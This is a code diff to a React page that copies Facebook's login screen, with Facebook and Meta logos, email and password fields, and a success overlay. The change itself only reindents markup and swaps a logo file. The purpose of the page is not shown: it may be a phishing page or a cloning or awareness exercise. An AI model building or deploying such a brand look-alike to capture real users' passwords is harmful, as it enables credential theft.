@@ -62,21 +62,21 @@ export default function FacebookLoginPage() {
       `}
 
       <div className="login-wrapper">
-      <div className="login-container">
-        <img src="/logos/fb-logo.svg" alt="Facebook Logo" />
-        <input id="email" type="text" placeholder="Mobile number or email address" value={email} onChange={(e) => setEmail(e.target.value)} />
-        <input id="password" type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
-        <span id="feedback" style={{color: 'red', fontFamily: 'sans-serif', fontSize: '15px', textAlign: 'center', margin: '0 30px'}}>{feedback}</span>
-        <button id="login" onClick={handleLogin}>Log in</button>
-        <a className="forgot" href="#">Forgotten Password?</a>
-        <button className="secondary-button" onClick={() => console.log('Create new account')}>Create new account</button>
-        
-        <div className="footer">
-          <img src="/logos/meta-logo.png" alt="Meta Logo" />
-          <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
+        <div className="login-container">
+          <img className="logo" src="/logos/fb-logo.svg" alt="Facebook Logo" />
+          <input id="email" type="text" placeholder="Mobile number or email address" value={email} onChange={(e) => setEmail(e.target.value)} />
+          <input id="password" type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
+          <span id="feedback" style={{color: 'red', fontFamily: 'sans-serif', fontSize: '15px', textAlign: 'center', margin: '0 30px'}}>{feedback}</span>
+          <button id="login" onClick={handleLogin}>Log in</button>
+          <a className="forgot" href="#">Forgotten Password?</a>
+          <button className="secondary-button" onClick={() => console.log('Create new account')}>Create new account</button>
+          
+          <div className="footer">
+            <img id="meta-logo" src="/logos/meta-logo.svg" alt="Meta Logo" />
+            <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
+          </div>
         </div>
       </div>
-    </div>
 
       <div className="success-overlay" id="successOverlay" aria-hidden="true">
         <div className="success-box">
